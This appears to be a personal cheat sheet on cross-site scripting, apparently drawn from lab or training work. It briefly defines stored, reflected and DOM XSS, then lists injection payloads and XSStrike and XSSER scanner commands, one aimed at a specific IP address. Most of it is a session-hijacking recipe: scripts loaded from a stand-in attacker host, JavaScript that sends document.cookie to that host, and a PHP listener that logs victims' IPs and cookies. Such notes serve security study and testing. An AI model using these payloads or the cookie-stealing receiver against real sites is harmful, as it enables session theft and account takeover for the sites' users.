https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
# **Stored XSS** (Persistent)
Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).

# **Reflected XSS** (Non-Persistent)
Occurs when user input is displayed on the page after processing (e.g., search result or error message).
# **DOM XSS** (Non-Persistent)
Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title). `Document Object Model`
```xss
<img src="" onerror=alert(window.origin)>
```

```xss
#"><img src=/ onerror=alert(document.cookie)>
```

# XSS Discovery
### XSStrike
```git
git clone https://github.com/s0md3v/XSStrike.git
```
###### GET
```py
python3 xsstrike.py -u "http://example.com/search.php?q=query"
```
###### POST
```py
python xsstrike.py -u "http://example.com/search.php" --data "q=query"
```
###### JSON
```py
python xsstrike.py -u "http://example.com/search.php" --data '{"q":"query"}' --json
```
### XSSER
```xsser
xsser -u 'http://94.237.57.59:53069/?fullname=XSS&username=XSS&password=XSS&email=XSS'
```
# Session Hijacking
## Blind XSS Detection
### Loading a Remote Script
```js
<script src="http://OUR_IP:PORT/script.js"></script>
```

```js
<script src="http://OUR_IP:PORT/username"></script>
```
Start a listener
```bash
sudo php -S 0.0.0.0:80
```
Inject XSS on fields to detect vulnerabilities
```field
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```
Create javascript payloads
```js
document.location='http://OUR_IP:PORT/index.php?c='+document.cookie;
new Image().src='http://OUR_IP:PORT/index.php?c='+document.cookie;
```
script.js
```js
new Image().src='http://OUR_IP:PORT/index.php?c='+document.cookie;
```
index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Inject this XSS to capture in the listener
```js
<script src=http://OUR_IP:PORT/script.js></script>
```


